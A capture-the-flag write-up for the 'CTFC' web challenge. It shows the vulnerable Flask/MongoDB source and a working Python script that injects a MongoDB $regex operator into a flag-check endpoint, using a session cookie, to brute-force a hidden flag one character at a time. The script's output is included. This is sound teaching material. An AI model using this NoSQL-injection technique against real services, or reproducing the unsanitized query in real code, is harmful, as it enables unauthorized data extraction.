# CTFC

## Description
```
I'm excited to share my minimal CTF platform with you all, take a look! btw it's ImPAWSIBLE to solve all challenges 😺

Note: flag format is INTIGRITI{.*}
```

## Provided Files
`CTFC.zip`

## Writeup

Starting off we got some files to look at. Extracting the `.zip` we got a Dockerfile and some Python files for the main logic of the web application. <br/>

Taking a look at the `app.py` file. <br/>
```py
from flask import Flask,render_template,request,session,redirect
import pymongo
import os
from functools import wraps
from datetime import timedelta
from hashlib import md5
from time import sleep

app = Flask(__name__)
app.secret_key = os.environ['SECRET_KEY']

# db settings
client = pymongo.MongoClient('localhost',27017)
db = client.ctfdb

def createChalls():
	db.challs.insert_one({"_id": "28c8edde3d61a0411511d3b1866f0636","challenge_name": "Crack It","category": "hash","challenge_description": "My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}","challenge_flag": "CTFC{cryptocat}","points": "500","released": "True"})
	db.challs.insert_one({"_id": "665f644e43731ff9db3d341da5c827e1","challenge_name": "MeoW sixty IV","category": "crypto","challenge_description": "hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters","challenge_flag": "CTFC{n0w_g0_4_th3_r34L_fl4G}","points": "1000","released": "True"})
	db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})

# login check
def check_login(f):
	@wraps(f)
	def wrap(*args,**kwrags):
		if 'user' in session:
			return f(*args,**kwrags)
		else:
			return render_template('dashboard.html')
	return wrap

# routes
from user import routes

@app.route('/')
@check_login
def dashboard():
	challs = []
	for data in db.challs.find():
		del data['challenge_flag']
		challs.append(data)	
	chall_1 = challs[0]
	chall_2 = challs[1]
	return render_template('t_dashboard.html',username=session['user']['username'],chall_1=chall_1,chall_2=chall_2)

@app.route('/register')
def register():
	return render_template('register.html')

@app.route('/login')
def login():
	return render_template('login.html')

@app.route('/logout')
def logout():
	session.clear()
	return redirect('/')

@app.route('/submit_flag',methods=['POST'])
@check_login
def submit_flag():
	_id = request.json.get('_id')[-1]
	submitted_flag = request.json.get('challenge_flag')
	chall_details = db.challs.find_one(
			{
			"_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
			"challenge_flag":submitted_flag
			}
	)
	if chall_details ==  None:
		return "wrong flag!"
	else:
		return "correct flag!"

# wait untill mongodb start then create the challs in db
sleep(10)
createChalls()
```

Noteworthy things: <br/>
```py
def createChalls():
	db.challs.insert_one({"_id": "28c8edde3d61a0411511d3b1866f0636","challenge_name": "Crack It","category": "hash","challenge_description": "My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}","challenge_flag": "CTFC{cryptocat}","points": "500","released": "True"})
	db.challs.insert_one({"_id": "665f644e43731ff9db3d341da5c827e1","challenge_name": "MeoW sixty IV","category": "crypto","challenge_description": "hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters","challenge_flag": "CTFC{n0w_g0_4_th3_r34L_fl4G}","points": "1000","released": "True"})
	db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})
```

In this function our flag get's injected into the MongoDB database. <br/>
```py
@app.route('/submit_flag',methods=['POST'])
@check_login
def submit_flag():
	_id = request.json.get('_id')[-1]
	submitted_flag = request.json.get('challenge_flag')
	chall_details = db.challs.find_one(
			{
			"_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
			"challenge_flag":submitted_flag
			}
	)
	if chall_details ==  None:
		return "wrong flag!"
	else:
		return "correct flag!"
```

This function basically returns a boolean if we enter the correct flag. <br/>
After more reconnaissance I found no other entrypoint where we could interact with the flag or the database. <br/>
Knowing that this is the only endpoint we can check if we got the correct flag or not I thought about how I could possibly bruteforce the flag. <br/>
A friend of mine came up with the idea of using a regular expression to bruteforce every character one by one. <br/>
Implementation of the idea in a python script: <br/>
```py
import requests

url = "https://ctfc.ctf.intigriti.io/submit_flag"
session_cookie = "session=eyJ1c2VyIjp7Il9pZCI6IjNkZTBjZjk5NjY0YjQ2MDE5ZTdhZTk0ZTk4MGZlZDcwIiwidXNlcm5hbWUiOiJmZmYifX0.ZViSYA.4OKP98khpZBAM2qInNa9xSLkEmY"

alr_flag = ""

def send_flag_request(flag, char):
    global alr_flag
    
    headers = {
        "Content-Type": "application/json",
        "Cookie": session_cookie
    }

    data = {
        "_id": "3",
        "challenge_flag": {
            "$regex": flag
        }
    }

    response = requests.post(url, headers=headers, json=data)

    if "wrong flag!" in response.text.lower():
        return

    else:
        print("Flag-Part Found: INTIGRITI{" + alr_flag + char + "}")
        alr_flag += char
        return True 

while True:
    restart_loop = False
    
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
        flag = "INTIGRITI{" + alr_flag + char + ".*?}"
        if send_flag_request(flag, char):
            restart_loop = True 
            break  
    
    if not restart_loop:
        break
```

After logging into an accoun on the website I copied the session cookie to the python script. <br/>
Using this script I basically try 1 character at the time and blank out the rest of the flag. <br/>
Executing the script: <br/>
```sh
$ python3 bruteforcer.py
Flag-Part Found: INTIGRITI{h}
Flag-Part Found: INTIGRITI{h0}
Flag-Part Found: INTIGRITI{h0w}
Flag-Part Found: INTIGRITI{h0w_}
Flag-Part Found: INTIGRITI{h0w_1}
Flag-Part Found: INTIGRITI{h0w_1s}
Flag-Part Found: INTIGRITI{h0w_1s_}
Flag-Part Found: INTIGRITI{h0w_1s_7}
Flag-Part Found: INTIGRITI{h0w_1s_7h}
Flag-Part Found: INTIGRITI{h0w_1s_7h4}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_P}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PA}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAW}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAWS}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAWSI}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAWSIB}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAWSIBL}
Flag-Part Found: INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
```

Like this I bruteforced the flag using regex. 


